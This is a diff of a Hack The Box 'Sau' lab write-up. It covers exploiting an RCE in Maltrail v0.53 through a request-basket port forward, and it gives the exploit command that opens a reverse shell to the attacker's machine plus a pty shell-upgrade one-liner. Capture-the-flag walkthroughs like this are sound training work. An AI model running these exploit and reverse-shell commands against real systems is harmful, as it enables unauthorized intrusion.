@@ -33,24 +33,28 @@ We can forward port 80 to this request basket.
 
 ![Alt text](/assets/uploads/htb-sau/2024-01-12 14_05_51.png)
 
-Now we can visit visit http://10.10.11.224:55555/d0kb80v and see that port 80 is running Maltrail v0.53. With some searching, we can see that there is an RCE vulnerability on this https://github.com/spookier/Maltrail-v0.53-Exploit
+Now we can visit visit http://sau.htb:55555/mhvi3fu and see that port 80 is running Maltrail v0.53. With some searching, we can see that there is an RCE vulnerability on this https://github.com/spookier/Maltrail-v0.53-Exploit
 
 
 # Exploitation
 Let us clone this repository, setup a listener on port 111 and run the exploit to get a reverse shell
 
 ---
+
 python3 exploit.py 10.10.14.36 1111 http://sau.htb:55555/mhvi3fu
+
 ---
 
 We can now obtain the user flag at /home/puma/user.txt
 
-![Alt text](/assets/uploads/htb-sau/2024-01-12 14_09_34.png)
+![Alt text](/assets/uploads/htb-sau/2024-01-12 14_11_48.png)
 
-At this point, let us also upgrade our shell to a pty shell using
+At this point, let us also upgrade our shell to a pty shell by running
 
 ---
+
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 ---
 
 # Privilege Escalation
